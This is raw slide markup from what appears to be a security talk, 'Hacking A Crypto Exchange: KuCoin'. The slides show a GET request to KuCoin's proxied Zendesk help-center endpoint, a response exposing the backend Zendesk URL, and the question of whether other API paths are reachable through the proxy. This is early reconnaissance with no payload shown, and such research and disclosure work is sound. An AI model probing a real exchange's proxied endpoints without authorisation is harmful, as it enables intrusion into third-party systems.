              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="487" name="Google Shape;487;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="488" name="Google Shape;488;p61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8398200" cy="30123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 sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Came across a GET request:</a:t>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>GET /_api/zendesk/api/v2/help_center/en-us/articles/6545352890265.json HTTP/1.1</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Host: www.kucoin.com</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="492" name="Shape 492"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="493" name="Google Shape;493;p62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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4" name="Google Shape;494;p62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="495" name="Google Shape;495;p62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="496" name="Google Shape;496;p62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="497" name="Google Shape;497;p62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8398200" cy="42651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 sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Response:</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"data": {</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>		"article": {</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>			"id": 6545352890265,</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>			"url": "https://</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>kucoin.zendesk.com/api/v2/help_center/en-us/articles/6545352890265.json</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>– SNIP –</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="501" name="Shape 501"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="502" name="Google Shape;502;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3" name="Google Shape;503;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="504" name="Google Shape;504;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="505" name="Google Shape;505;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="506" name="Google Shape;506;p63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8398200" cy="34239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b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Is</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>/_api/zendesk/* </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>reverse proxying to the Zendesk API?</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Could we hit other paths besides the help center endpoint?</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
